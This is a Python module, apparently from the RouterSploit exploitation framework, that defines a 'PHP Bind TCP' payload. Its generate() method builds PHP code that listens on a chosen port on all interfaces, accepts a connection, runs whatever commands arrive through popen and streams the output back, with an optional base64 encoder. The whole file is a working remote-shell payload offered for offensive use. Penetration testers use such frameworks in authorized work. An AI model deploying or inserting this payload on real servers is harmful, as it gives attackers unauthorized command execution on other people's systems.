from routersploit.core.exploit.option import OptEncoder
from routersploit.core.exploit.payloads import (
    GenericPayload,
    Architectures,
    BindTCPPayloadMixin,
)
from routersploit.modules.encoders.php.base64 import Encoder


class Payload(BindTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "PHP Bind TCP",
        "description": "Creates interactive tcp bind shell by using php.",
        "authors": (
            "Andre Marques (zc00l)",  # shellpop
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    architecture = Architectures.PHP
    encoder = OptEncoder(Encoder(), "Encoder")

    def generate(self):
        return (
            "$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);" +
            "socket_bind($s,\"0.0.0.0\",{});".format(self.rport) +
            "socket_listen($s,1);" +
            "$cl=socket_accept($s);" +
            "while(1){" +
            "if(!socket_write($cl,\"$ \",2))exit;" +
            "$in=socket_read($cl,100);" +
            "$cmd=popen(\"$in\",\"r\");" +
            "while(!feof($cmd)){" +
            "$m=fgetc($cmd);" +
            "socket_write($cl,$m,strlen($m));" +
            "}}"
        )
